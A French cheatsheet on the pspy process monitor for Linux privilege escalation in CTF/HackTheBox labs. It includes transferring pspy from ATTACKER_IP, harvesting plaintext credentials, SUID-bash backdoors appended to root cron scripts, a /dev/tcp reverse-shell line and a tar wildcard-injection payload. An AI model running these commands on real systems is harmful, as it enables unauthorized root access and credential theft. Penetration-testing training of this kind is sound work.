# 👁️ pspy - Cheatsheet Cyber Sécurité

Guide orienté **surveillance de processus** et **escalade de privilèges** avec pspy. Focus sur la détection de tâches planifiées, cronjobs et processus lancés par d'autres utilisateurs.

---

## 📖 Qu'est-ce que pspy ?

**pspy** est un outil de monitoring de processus qui permet de **voir les commandes exécutées par tous les utilisateurs** (y compris root) **sans avoir besoin de privilèges root**. Il fonctionne en lisant `/proc` directement.

**Cas d'usage principaux** :
- Détecter des **cronjobs** lancés par root
- Observer des **scripts automatiques** exécutés périodiquement
- Trouver des **mots de passe en clair** dans des commandes
- Identifier des **fichiers/scripts writables** exécutés par root
- Détecter des **processus éphémères** invisibles avec `ps`

**Avantages** :
- **Pas de root requis**
- Binaire statique (pas de dépendances)
- Détecte les processus très courts (que `ps` rate)
- Monitore aussi les events filesystem (inotify)
- Pas d'installation nécessaire

---

## ⚙️ Installation et Transfert

### Téléchargement

```bash
# GitHub Releases (machine attaquante)
# https://github.com/DominicBreuker/pspy/releases

# Version 32 bits
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32

# Version 64 bits (la plus commune)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64

# Versions avec filesystem events (plus verbose)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s

# Rendre exécutable
chmod +x pspy64
```

### Transfert sur la cible

```bash
# Depuis votre machine attaquante
python3 -m http.server 8080

# Sur la cible (téléchargement)
wget http://ATTACKER_IP:8080/pspy64 -O /tmp/pspy64
curl http://ATTACKER_IP:8080/pspy64 -o /tmp/pspy64

# Rendre exécutable
chmod +x /tmp/pspy64

# Via SCP si SSH disponible
scp pspy64 user@target:/tmp/pspy64
```

---

## 1️⃣ Utilisation de Base

### Lancement

```bash
# Lancement simple
./pspy64

# En arrière-plan avec output dans fichier
./pspy64 > /tmp/pspy-output.txt 2>&1 &

# Avec timeout (surveiller 5 minutes)
timeout 300 ./pspy64

# Quiet mode (moins de bruit)
./pspy64 -q

# Verbose
./pspy64 -v
```

### Comprendre l'output

```
2024/01/01 12:00:01 CMD: UID=0    PID=1234   | /bin/sh -c /opt/scripts/backup.sh
2024/01/01 12:00:01 CMD: UID=0    PID=1235   | /bin/bash /opt/scripts/backup.sh
2024/01/01 12:00:01 CMD: UID=1000 PID=1236   | python3 /home/user/app.py
```

```
UID=0     → Exécuté par root
UID=1000  → Exécuté par un utilisateur normal
PID       → ID du processus
CMD       → Commande complète avec arguments
```

---

## 2️⃣ Options Importantes

### Intervalles de polling

```bash
# Intervalle de poll des processus (ms, défaut: 100)
./pspy64 -p 500

# Intervalle de poll du filesystem (ms, défaut: 50)
./pspy64 -f 100

# Combiner les deux
./pspy64 -p 200 -f 100

# Plus rapide (ne rate aucun processus court)
./pspy64 -p 10 -f 10
```

### Monitoring filesystem

```bash
# Activer le monitoring des events inotify
./pspy64 -i

# Spécifier les répertoires à monitorer
./pspy64 --inotify-paths /tmp,/opt,/home

# Surveiller /tmp uniquement
./pspy64 -i --inotify-paths /tmp

# Surveillance combinée
./pspy64 -p 50 -i --inotify-paths /tmp,/var/tmp,/opt
```

### Buffer et affichage

```bash
# Taille du buffer de sortie
./pspy64 -b 4096

# Couleurs (défaut activé)
./pspy64 --color

# Sans couleurs (pour redirection fichier)
./pspy64 --nocolor > output.txt
```

---

## 3️⃣ Patterns à Chercher

### Cronjobs root

```
UID=0 ... | /bin/sh -c    → Script shell lancé par root (cron)
UID=0 ... | /bin/bash     → Script bash lancé par root
UID=0 ... | python3 /opt/ → Script Python lancé par root
UID=0 ... | /usr/bin/perl → Script Perl lancé par root
```

### Mots de passe en clair

```bash
# Dans l'output pspy, chercher
grep -iE "pass|password|passwd|pwd|secret|token|key" pspy-output.txt

# Commandes avec credentials
grep -E "\-p |\-pass|\-password|:.*@" pspy-output.txt
```

### Scripts writables

```bash
# Identifier les scripts lancés par root
grep "UID=0" pspy-output.txt | grep -oP '(/[a-zA-Z0-9_/.-]+\.(sh|py|pl|rb))' | sort -u

# Vérifier si on peut écrire dessus
# Pour chaque script détecté :
ls -la /path/to/script.sh
stat /path/to/script.sh
```

### Wildcards dangereux

```bash
# Chercher des commandes avec wildcards (tar, chown, chmod avec *)
grep "UID=0" pspy-output.txt | grep -E "\*|/\*"

# Pattern classique vulnérable
# root lance : tar -czf backup.tar.gz /tmp/*
# → Exploitation via wildcard injection
```

---

## 4️⃣ Workflow d'Exploitation

### Étape 1 : Surveiller les processus

```bash
# Lancer pspy et attendre plusieurs minutes
./pspy64 | tee /tmp/pspy-log.txt

# Attendre au moins 2 cycles de cron (2 minutes minimum)
# Les cronjobs lancés toutes les minutes apparaissent rapidement
# Les tâches horaires/quotidiennes demandent plus de patience
```

### Étape 2 : Identifier les cibles

```bash
# Filtrer les processus root avec des scripts
grep "UID=0" /tmp/pspy-log.txt | grep -v "]\|kthread\|migration\|watchdog" | grep -E "\.sh|\.py|\.pl|/bin/(sh|bash)"

# Lister les scripts uniques
grep "UID=0" /tmp/pspy-log.txt | grep -oP '(/[^\s]+\.(sh|py|pl|rb))' | sort -u
```

### Étape 3 : Analyser les permissions

```bash
# Pour chaque script identifié
TARGET_SCRIPT="/opt/scripts/backup.sh"

ls -la $TARGET_SCRIPT                  # Permissions
stat $TARGET_SCRIPT                    # Infos complètes
find / -name "backup.sh" 2>/dev/null   # Trouver d'autres instances

# Vérifier les permissions du répertoire
ls -la $(dirname $TARGET_SCRIPT)

# Peut-on écrire ?
[ -w $TARGET_SCRIPT ] && echo "WRITABLE!" || echo "Not writable"
```

### Étape 4 : Exploiter

```bash
# Si le script est writable
echo "chmod +s /bin/bash" >> /opt/scripts/backup.sh
# Attendre l'exécution par root...
ls -la /bin/bash  # Vérifier le SUID bit

# Reverse shell dans le script
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/scripts/backup.sh

# Si le répertoire est writable mais pas le script
# → Remplacer le script entier
cp /opt/scripts/backup.sh /tmp/backup.sh.bak
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh

# Si wildcard tar (tar czf archive.tar.gz /some/path/*)
# → Wildcard injection
cd /some/path/
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=bash exploit.sh'
cat > exploit.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x exploit.sh
```

---

## 5️⃣ Cas Pratiques CTF/HTB

### HackTheBox - PrivEsc classique

```bash
# 1. Transférer pspy sur la cible
wget http://10.10.14.X:8080/pspy64 -P /tmp/
chmod +x /tmp/pspy64

# 2. Lancer en arrière-plan
/tmp/pspy64 -p 50 | tee /tmp/pspy.log &

# 3. Attendre 2-3 minutes (laisser tourner)
sleep 180

# 4. Analyser
grep "UID=0" /tmp/pspy.log | grep -v "]\|kthread"

# 5. Kill pspy
kill %1
```

### Exemple de découverte

```bash
# pspy détecte :
# 2024/01/01 12:01:01 CMD: UID=0 PID=1337 | /bin/bash /opt/maintenance/cleanup.sh

# Vérifier les permissions
ls -la /opt/maintenance/cleanup.sh
# -rwxrwxr-x 1 root root 150 Jan 1 10:00 /opt/maintenance/cleanup.sh
# → WORLD WRITABLE ! Exploitable !

# Exploiter
echo "chmod u+s /bin/bash" >> /opt/maintenance/cleanup.sh

# Attendre l'exécution...
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash  → SUID posé !

# Obtenir root
/bin/bash -p
# bash-5.0# id
# uid=1000(user) gid=1000(user) euid=0(root)
```

### Détection de mot de passe en clair

```bash
# pspy peut révéler :
# CMD: UID=0 | mysql -u root -psecretpassword123 dbname
# CMD: UID=0 | curl -u admin:password123 http://internal/api

# → Réutiliser ces credentials pour SSH, su, etc.
su root  # avec le password trouvé
ssh root@localhost
```

---

## 6️⃣ Alternatives et Compléments

### Sans pspy (méthodes manuelles)

```bash
# Surveiller les processus en boucle
watch -n 1 'ps auxf'

# Script de monitoring basique
while true; do
    ps aux --no-headers >> /tmp/processes.txt
    sleep 1
done

# Diff pour trouver les nouveaux processus
ps aux > /tmp/ps1.txt
sleep 5
ps aux > /tmp/ps2.txt
diff /tmp/ps1.txt /tmp/ps2.txt

# Lire les cronjobs directement
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
crontab -l
```

### Compléments utiles

```bash
# Cronjobs de l'utilisateur courant
crontab -l

# Cronjobs système
cat /etc/crontab
cat /etc/cron.d/*
ls /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly

# Timers systemd (alternative aux cronjobs)
systemctl list-timers --all

# Processus en cours au moment T
ps auxef
```

---

## 7️⃣ Cheatsheet Rapide

```bash
# Lancement simple
./pspy64

# Avec output fichier
./pspy64 | tee /tmp/pspy.log

# En arrière-plan
./pspy64 > /tmp/pspy.log 2>&1 &

# Avec filesystem events
./pspy64 -i

# Poll rapide (ne rate rien)
./pspy64 -p 10

# Timeout 5 minutes
timeout 300 ./pspy64

# Filtrer root uniquement
./pspy64 | grep "UID=0"

# Chercher scripts dans l'output
grep "UID=0" /tmp/pspy.log | grep -E "\.sh|\.py|\.pl"

# Chercher passwords
grep -iE "pass|secret|token" /tmp/pspy.log

# Trouver scripts writables
grep "UID=0" /tmp/pspy.log | grep -oP '(/[^\s]+\.sh)' | sort -u | xargs ls -la
```

---

## 💡 Tips Pro

1. **Toujours laisser tourner au moins 2 minutes** pour capturer les cron minuteurs
2. **-p 10** pour ne rater aucun processus court (commandes éphémères)
3. **tee** pour avoir l'output en live ET dans un fichier pour analyse
4. **Chercher les wildcards** : `tar`, `chown`, `chmod` avec `*` sont souvent exploitables
5. **Ne pas oublier les timers systemd** en complément des cronjobs
6. **Mots de passe en clair** dans les arguments de commande : très fréquent !
7. **Répertoires writables** : même si le script ne l'est pas, remplacer le binaire/script
8. **pspy32s/pspy64s** incluent les events inotify par défaut (variantes avec 's')
9. **Transférer via base64** si wget/curl bloqués :
   ```bash
   # Attaquant : cat pspy64 | base64 | tr -d '\n'
   # Cible : echo "BASE64..." | base64 -d > pspy64
   ```
10. **Patience** : certains scripts ne tournent qu'une fois par heure ou par jour

---

**👁️ pspy est l'outil numéro 1 pour la surveillance de processus en privesc Linux. Toujours le lancer après avoir obtenu un shell !**
